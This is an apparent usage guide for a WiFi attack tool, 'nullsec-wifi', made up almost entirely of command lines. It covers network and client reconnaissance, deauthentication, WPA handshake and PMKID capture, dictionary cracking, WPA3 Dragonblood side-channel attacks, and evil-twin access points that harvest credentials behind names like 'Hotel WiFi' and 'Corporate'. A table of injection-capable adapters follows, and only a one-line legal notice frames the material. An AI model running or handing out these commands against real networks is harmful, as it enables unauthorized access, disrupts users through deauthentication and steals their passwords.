# NullSec WiFi Attack Guide

## Reconnaissance

### Network Discovery
```bash
# Scan for networks
nullsec-wifi --scan --interface wlan0

# Monitor mode
nullsec-wifi --monitor --interface wlan0

# Channel hopping
nullsec-wifi --hop --interface wlan0mon
```

### Client Detection
```bash
# List connected clients
nullsec-wifi --clients --bssid AA:BB:CC:DD:EE:FF

# Probe request capture
nullsec-wifi --probes --interface wlan0mon
```

## WPA/WPA2 Attacks

### Handshake Capture
```bash
# Capture handshake
nullsec-wifi --capture --bssid AA:BB:CC:DD:EE:FF -o handshake.cap

# Deauth to force reconnection
nullsec-wifi --deauth --bssid AA:BB:CC:DD:EE:FF --client FF:EE:DD:CC:BB:AA
```

### PMKID Attack
```bash
# Capture PMKID (no deauth needed)
nullsec-wifi --pmkid --bssid AA:BB:CC:DD:EE:FF -o pmkid.16800
```

### Cracking
```bash
# Dictionary attack
nullsec-wifi --crack --handshake handshake.cap --wordlist rockyou.txt

# With hashcat
nullsec-wifi --crack --pmkid pmkid.16800 --hashcat --wordlist rockyou.txt
```

## WPA3 Attacks

### Dragonblood
```bash
# Timing side-channel attack
nullsec-wifi --dragonblood --timing --bssid AA:BB:CC:DD:EE:FF

# Cache attack
nullsec-wifi --dragonblood --cache --bssid AA:BB:CC:DD:EE:FF
```

## Evil Twin

### Captive Portal
```bash
# Create evil twin
nullsec-wifi --evil-twin --essid "Free WiFi" --interface wlan0

# With captive portal
nullsec-wifi --evil-twin --essid "Hotel WiFi" --portal login.html
```

### Credential Harvesting
```bash
nullsec-wifi --evil-twin --essid "Corporate" --wpa --harvest
```

## Hardware

| Adapter | Chipset | Monitor Mode | Injection |
|---------|---------|--------------|-----------|
| Alfa AWUS036ACH | RTL8812AU | ✓ | ✓ |
| Alfa AWUS036ACS | RTL8811AU | ✓ | ✓ |
| TP-Link TL-WN722N v1 | Atheros | ✓ | ✓ |
| Panda PAU09 | RT5572 | ✓ | ✓ |

## Legal Notice
For authorized penetration testing only. Unauthorized access is illegal.
